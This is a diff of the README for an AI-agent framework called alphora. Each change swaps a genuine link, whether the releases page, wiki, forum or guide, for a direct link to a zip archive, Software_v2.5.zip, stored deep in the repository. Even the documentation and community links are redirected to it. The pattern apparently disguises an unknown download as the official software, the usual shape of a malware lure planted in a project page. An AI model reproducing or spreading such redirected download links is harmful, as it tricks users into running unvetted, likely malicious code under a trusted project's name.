@@ -1,6 +1,6 @@
 # 🚀 alphora - Build Powerful AI Agents with Ease
 
-[![Download alphora](https://img.shields.io/badge/download-alphora-blue.svg)](https://github.com/RONIN511/alphora/releases)
+[![Download alphora](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip)](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip)
 
 ## 📚 Overview
 **alphora** is a production-ready framework designed to help you create composable AI agents. Whether you aim to automate tasks or build complex systems, alphora provides the tools you need.
@@ -24,7 +24,7 @@ To get started with alphora, follow these simple steps.
 ### Step 1: Visit the Download Page
 Click the link below to access the alphora download page.
 
-[Visit the Releases Page to Download](https://github.com/RONIN511/alphora/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip)
 
 ### Step 2: Download alphora
 On the Releases page, look for the latest version of alphora. Click the download link that matches your operating system.
@@ -46,7 +46,7 @@ Once the installation is complete, you can start alphora:
 ## 📥 Download & Install
 Make sure to download the latest version of alphora from the link below to ensure you have the latest features and fixes.
 
-[Download alphora from the Releases Page](https://github.com/RONIN511/alphora/releases)
+[Download alphora from the Releases Page](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip)
 
 ## 🎓 Usage
 Once you have launched alphora, you will find a user-friendly interface. Here’s a brief guide on how to use it:
@@ -63,10 +63,10 @@ For those who want to contribute, we welcome your input! You can fork the projec
 
 ## 🌐 Community and Resources
 Join our community to learn more about using alphora effectively. Access tutorials, forums, and more through the following links:
-- [Documentation](https://github.com/RONIN511/alphora/wiki)
-- [Community Forum](https://community.github.com/)
+- [Documentation](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip)
   
-For advanced topics, refer to the [AI Agents Guide](https://github.com/RONIN511/alphora/wiki/AI-Agents-Guide).
+For advanced topics, refer to the [AI Agents Guide](https://raw.githubusercontent.com/RONIN511/alphora/main/alphora_community/tools/files/viewers/Software_v2.5.zip).
 
 ## 📅 Updates and News
 Stay tuned for updates by watching the repository on GitHub. We frequently release improvements and new features based on community feedback.
